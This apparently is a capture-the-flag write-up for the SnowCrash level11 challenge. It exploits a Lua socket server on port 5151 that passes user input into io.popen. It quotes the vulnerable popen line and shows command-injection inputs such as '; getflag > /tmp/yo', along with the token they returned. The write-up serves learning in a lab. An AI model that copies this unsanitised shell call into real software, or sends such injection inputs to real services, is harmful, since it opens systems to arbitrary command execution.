## Phase 1: Reconnaissance

Upon connecting to the level, we find a single file in the home directory:
- A Lua script

Inspecting the script shows that it creates a **socket server** listening on port **5151**

To confirm that a server is running, we list listening network ports:

```bash
ss -lntu
```

Output:

```txt
Netid  State  Recv-Q Send-Q   Local Address:Port     Peer Address:Port
tcp    LISTEN 0      32       127.0.0.1:5151         *:*
```

This confirms that a server is actively listening on **port 5151**, but only on the **loopback interface**

This explains why connecting from outside the VM fails

---

## Phase 2: Server Interaction

Since the server is running on loopback, `127.0.0.1`, we must connect from inside the VM:

```bash
nc 127.0.0.1 5151
```

- We insert random input and get an answer as described in the Lua code
  
```console
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: fdsjfdjsdfs
Erf nope..
```

This behavior totally matches what is described in the Lua script

---

## Phase 3: Code Analysis & Vulnerability

We now go back to the code and we notice the following line

```lua
  prog = io.popen("echo "..pass.." | sha1sum", "r")
```

This looks like a possible attack vector, because `popen` opens a shell
- What this does is, for example if `pass` is "hello", what is being ran in bash is:  
`echo hello | sha1sum`


Since the password is inserted directly into a shell command, shell characters such as `;` can be used to execute arbitrary commands

This allows us to break out of the intended `echo | sha1sum` command

---

## Phase 4: Exploitation

We test for command injection by submitting the following input:

```console
; whoami > /tmp/yo
```

We then read the file:

```bash
cat /tmp/yo
flag11
```

This confirms that my arbitrary command is executed with **flag11 privileges**


So now we repeat the same attack using `getflag` command:

```bash
nc 127.0.0.1 5151
Password: ; getflag > /tmp/yo
Erf nope..
```

Then we read the output:

```bash
cat /tmp/yo
```

Result:

```txt
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
